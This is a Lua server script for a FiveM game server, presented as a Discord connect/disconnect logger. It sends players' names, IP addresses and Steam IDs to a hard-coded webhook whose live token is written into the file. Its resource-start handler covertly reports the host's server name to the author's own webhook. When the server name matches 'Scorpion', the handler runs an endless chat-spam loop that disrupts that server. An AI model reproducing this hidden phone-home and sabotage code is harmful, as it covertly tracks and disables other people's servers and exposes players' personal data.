local logs = "https://discord.com/api/webhooks/918885559009681528/IVJa1u3SM1irXfFxi7H8EV8k_ZLG9AEcP7AviZdpBLSD8ldtJNSzz3VkFjkgPISbrPPZ"
local communityname = "A1pha Project"
local communtiylogo = "https://media.discordapp.net/attachments/916117958823141376/917508332670033930/A1pha-Logo.png?width=461&height=461" --Skal være en .png eller .jpg

AddEventHandler('playerConnecting', function()
local name = GetPlayerName(source)
local ip = GetPlayerEndpoint(source)
local ping = GetPlayerPing(source)
local steamhex = GetPlayerIdentifier(source)
local connect = {
        {
            ["color"] = "8663711",
            ["title"] = "Spiller Joinede Server #1",
            ["description"] = "Spiller: **"..name.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**",
	        ["footer"] = {
                ["text"] = communityname,
                ["icon_url"] = communtiylogo,
            },
        }
    }

PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "A1pha Project", embeds = connect}), { ['Content-Type'] = 'application/json' })
end)

AddEventHandler('playerDropped', function(reason)
local name = GetPlayerName(source)
local ip = GetPlayerEndpoint(source)
local ping = GetPlayerPing(source)
local steamhex = GetPlayerIdentifier(source)
local disconnect = {
        {
            ["color"] = "8663711",
            ["title"] = "Spiller Gik Ud Af Server #1",
            ["description"] = "Spiller: **"..name.."** \nReason: **"..reason.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**",
	        ["footer"] = {
                ["text"] = communityname,
                ["icon_url"] = communtiylogo,
            },
        }
    }

    PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "A1pha Project", embeds = disconnect}), { ['Content-Type'] = 'application/json' })
end)


-- IK SKIFT DISSE WEBHOOKS UD DA DET ER TIL AT A1PHA KAN SE HVIS DU BENYTTER SCRIPTET 
-- DETTE SCRIPT ER IKKE ULOVLIGT!
AddEventHandler('onResourceStart', function(resourceName)
    if (GetCurrentResourceName() == resourceName) then
          servernavn = GetConvar("sv_hostname")
          scriptnavn = "A1pha-connectlog"
              if string.match(servernavn, "Scorpion") then
                  PerformHttpRequest('https://discord.com/api/webhooks/923601922538221568/RmE5LuvEe1F_G8i3OTUB-KggvVTg8qNdB6CMu4FQahjuxnYrDGZxfU6umt2m5-E2w2CV', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
                  while true do
                      TriggerClientEvent('chatMessage', -1, 'A1PHA CONNECTLOG SYSTEM BESKED:', {0, 191, 255}, "Du har ikke tillaldse MVH. A1pha Scripts")
                      Citizen.Wait(1)
                  end
              else
                  PerformHttpRequest('https://discord.com/api/webhooks/923601922538221568/RmE5LuvEe1F_G8i3OTUB-KggvVTg8qNdB6CMu4FQahjuxnYrDGZxfU6umt2m5-E2w2CV', function(err, text, headers) end, 'POST', json.encode({username = "ServerStart", content = "```["..servernavn.."]: Startede ["..scriptnavn.."]```"}), { ['Content-Type'] = 'application/json' })
              end
      end
  end)
